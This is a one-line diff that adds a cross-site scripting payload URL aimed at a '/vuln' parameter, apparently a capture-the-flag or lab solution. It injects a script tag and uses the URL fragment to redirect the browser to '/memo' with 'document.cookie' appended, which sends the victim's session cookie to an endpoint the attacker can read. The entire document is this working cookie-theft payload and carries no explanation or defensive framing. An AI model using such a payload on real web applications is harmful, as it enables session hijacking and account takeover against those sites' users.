@@ -1,0 +1,1 @@
+/vuln?param=<script id='name'></script>#location.href='/memo?memo='+document.cookie//;
